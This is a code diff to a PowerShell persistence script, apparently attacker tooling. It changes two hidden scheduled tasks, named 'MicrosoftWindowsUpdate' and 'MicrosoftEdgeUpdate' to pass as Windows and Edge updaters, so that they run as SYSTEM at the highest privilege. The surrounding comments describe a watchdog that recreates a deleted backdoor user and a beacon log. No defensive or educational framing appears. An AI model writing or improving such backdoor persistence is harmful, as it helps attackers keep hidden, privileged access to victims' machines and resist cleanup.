@@ -26,11 +26,13 @@ $action  = New-ScheduledTaskAction -Execute "powershell.exe" `
 $trigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 10) -Once -At (Get-Date)
 $settings = New-ScheduledTaskSettingsSet -Hidden
 
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
 Register-ScheduledTask -TaskName "MicrosoftWindowsUpdate" `
     -Action $action `
     -Trigger $trigger `
     -Settings $settings `
-    -RunLevel Highest `
+    -Principal $principal `
     -Force
 
 # ── Method 3: Watchdog scheduled task to recreate backdoor user if deleted ────
@@ -59,11 +61,13 @@ $watchdogAction   = New-ScheduledTaskAction -Execute "powershell.exe" `
 $watchdogTrigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
 $watchdogSettings = New-ScheduledTaskSettingsSet -Hidden
 
+$watchdogPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
 Register-ScheduledTask -TaskName "MicrosoftEdgeUpdate" `
     -Action $watchdogAction `
     -Trigger $watchdogTrigger `
     -Settings $watchdogSettings `
-    -RunLevel Highest `
+    -Principal $watchdogPrincipal `
     -Force
 
 # ── Beacon log for debugging ──────────────────────────────────────────────────
